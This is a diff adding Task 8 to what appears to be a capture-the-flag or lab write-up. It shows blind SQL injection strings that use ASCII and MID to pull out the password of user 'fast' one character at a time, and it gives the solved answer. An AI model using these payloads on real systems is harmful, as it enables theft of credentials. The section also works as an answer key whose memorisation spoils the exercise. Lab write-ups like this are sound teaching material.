@@ -133,9 +133,27 @@ Upon executing the query, you will retrieve the answer "level8please".
 
 ---
 
-## Task 8:
+## Task 8: Extracting Password Using SQL Injection
 ![1sql](src/sql8.png)
+To extract the password character by character, we can use a series of SQL injection queries. Each query retrieves the ASCII value of a specific character in the password using the `MID` function.
 
+Here is the step-by-step solution:
+1. Inject the following string as the value of $text in the query:
+```
+0 or id <= (SELECT ASCII(MID((SELECT pass from users WHERE login='fast'), 1,1)))
+```
+This query retrieves the ASCII value of the first character of the password. In this case, the ASCII value is 57, which corresponds to the character "9".
+
+2. Repeat the above step for the remaining characters of the password, incrementing the third argument of the MID function:
+```
+0 OR id <= (SELECT ASCII(MID((SELECT pass FROM users WHERE login='fast'), 2, 1)))
+0 OR id <= (SELECT ASCII(MID((SELECT pass FROM users WHERE login='fast'), 3, 1)))
+...
+0 OR id <= (SELECT ASCII(MID((SELECT pass FROM users WHERE login='fast'), 9, 1)))
+```
+3. Then go to `ASCII to text` site and decrypt password
+
+Upon executing the query, you will retrieve the answer "9levlpass".
 
 ---
 
